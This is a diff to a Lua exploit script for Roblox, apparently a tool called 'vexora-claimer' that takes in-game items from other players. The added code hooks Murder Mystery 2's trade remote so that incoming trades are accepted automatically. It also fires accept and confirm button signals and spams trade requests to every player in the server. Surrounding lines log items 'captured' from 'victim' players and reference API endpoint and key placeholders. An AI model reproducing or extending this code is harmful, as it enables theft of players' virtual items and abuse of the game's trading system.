@@ -6,7 +6,7 @@
   back after every teleport.
 ]]
 
-local CLAIMER_REV = "1.1"
+local CLAIMER_REV = "1.2"
 local API_BASE = "{{API_BASE}}"
 local API_KEY = "{{API_KEY}}"
 local ENDPOINT = "{{ENDPOINT}}"
@@ -168,6 +168,110 @@ local function capture(item, victim, value)
     print(string.format("[vexora-claimer] captured %s from %s", tostring(item), tostring(victim)))
 end
 
+--[[ ---- accept any incoming trade request ---- ]]
+local MM2 = PLACE == 142823291
+
+local function clickSignal(button)
+    if not button then return end
+    pcall(function() firesignal(button.Activated) end)
+    pcall(function() firesignal(button.MouseButton1Click) end)
+end
+
+local MM2_ACCEPT_PATHS = {
+    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
+    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "ActionButton" },
+    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
+    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
+    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
+    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
+    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
+    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
+}
+
+local function mm2TradeRoot()
+    if not MM2 then return nil end
+    return ReplicatedStorage:FindFirstChild("Trade")
+end
+
+local function mm2Confirm()
+    local trade = mm2TradeRoot()
+    local accept = trade and trade:FindFirstChild("AcceptRequest")
+    if accept then pcall(function() accept:FireServer() end) end
+
+    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not gui then return end
+    for _, path in ipairs(MM2_ACCEPT_PATHS) do
+        local node = gui
+        for _, name in ipairs(path) do
+            node = node and node:FindFirstChild(name)
+        end
+        clickSignal(node)
+    end
+end
+
+if MM2 then
+    task.spawn(function()
+        for _ = 1, 30 do
+            local trade = mm2TradeRoot() or ReplicatedStorage:WaitForChild("Trade", 2)
+            local sendRequest = trade and trade:FindFirstChild("SendRequest")
+            if sendRequest then
+                pcall(function()
+                    sendRequest.OnClientInvoke = function()
+                        task.spawn(function()
+                            task.wait(0.4)
+                            for _ = 1, 10 do
+                                mm2Confirm()
+                                task.wait(0.25)
+                            end
+                        end)
+                        return true
+                    end
+                end)
+                print("[vexora-claimer] mm2 SendRequest hook installed")
+                return
+            end
+            task.wait(2)
+        end
+        print("[vexora-claimer] mm2 SendRequest hook not installed")
+    end)
+end
+
+-- generic games: click accept on any incoming trade prompt, whoever sent it
+local function findAcceptButton()
+    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not gui then return nil end
+    for _, obj in ipairs(gui:GetDescendants()) do
+        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+            local text = obj:IsA("TextButton") and tostring(obj.Text) or ""
+            local label = (obj.Name .. " " .. text):lower()
+            if label:find("accept", 1, true) or label:find("confirm", 1, true) then
+                local node, context = obj, ""
+                while node and node ~= gui do
+                    context = context .. " " .. node.Name:lower()
+                    node = node.Parent
+                end
+                if context:find("trade", 1, true) or context:find("request", 1, true) then
+                    return obj
+                end
+            end
+        end
+    end
+    return nil
+end
+
+task.spawn(function()
+    while running do
+        task.wait(1.5)
+        if settings.autoAccept then
+            local button = findAcceptButton()
+            if button then
+                clickSignal(button)
+                print("[vexora-claimer] accepted an incoming trade request")
+            end
+        end
+    end
+end)
+
 for _, remote in ipairs(acceptRemotes) do
     pcall(function()
         remote.OnClientEvent:Connect(function(...)
@@ -205,12 +309,25 @@ local function startTrading(target)
         while running do
             local player = LocalPlayer
             if player and player.Character then
-                for _, remote in ipairs(tradeRemotes) do
-                    for _, other in ipairs(Players:GetPlayers()) do
-                        if other ~= player then
-                            pcall(function() remote:FireServer(other) end)
-                            pcall(function() remote:FireServer("trade", other) end)
-                            pcall(function() remote:FireServer("request", other) end)
+                if MM2 then
+                    local trade = mm2TradeRoot()
+                    local start = trade and trade:FindFirstChild("StartTrade")
+                    if start then
+                        for _, other in ipairs(Players:GetPlayers()) do
+                            if other ~= player then
+                                pcall(function() start:FireServer(other) end)
+                            end
+                        end
+                    end
+                    mm2Confirm()
+                else
+                    for _, remote in ipairs(tradeRemotes) do
+                        for _, other in ipairs(Players:GetPlayers()) do
+                            if other ~= player then
+                                pcall(function() remote:FireServer(other) end)
+                                pcall(function() remote:FireServer("trade", other) end)
+                                pcall(function() remote:FireServer("request", other) end)
+                            end
                         end
                     end
                 end
